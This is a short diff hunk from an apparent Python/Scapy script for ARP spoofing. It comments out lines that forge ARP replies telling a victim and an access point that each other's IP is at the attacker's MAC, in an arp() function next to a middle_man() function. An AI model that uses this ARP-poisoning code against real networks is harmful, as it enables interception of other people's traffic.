@@ -36,10 +36,10 @@ def arp():
 		hwdst='52:54:00:12:35:00', hwsrc=mac, op=2))
 		time.sleep(0.1)
 
-spoof_vic_pkt = Ether(src=attacker_mac,dst=vic_mac)/ARP(psrc=ap_ip, pdst=vic_ip,hwsrc=attacker_mac, op=2)	
-		sendp(spoof_vic_pkt)
-		spoof_ap_pkt = Ether(src=attacker_mac,dst=ap_mac)/ARP(psrc=vic_ip,pdst=ap_ip,hwsrc=attacker_mac,op=2)
-		sendp(spoof_ap_pkt)
+# spoof_vic_pkt = Ether(src=attacker_mac,dst=vic_mac)/ARP(psrc=ap_ip, pdst=vic_ip,hwsrc=attacker_mac, op=2)	
+# 		sendp(spoof_vic_pkt)
+# 		spoof_ap_pkt = Ether(src=attacker_mac,dst=ap_mac)/ARP(psrc=vic_ip,pdst=ap_ip,hwsrc=attacker_mac,op=2)
+# 		sendp(spoof_ap_pkt)
 
 
 def middle_man():
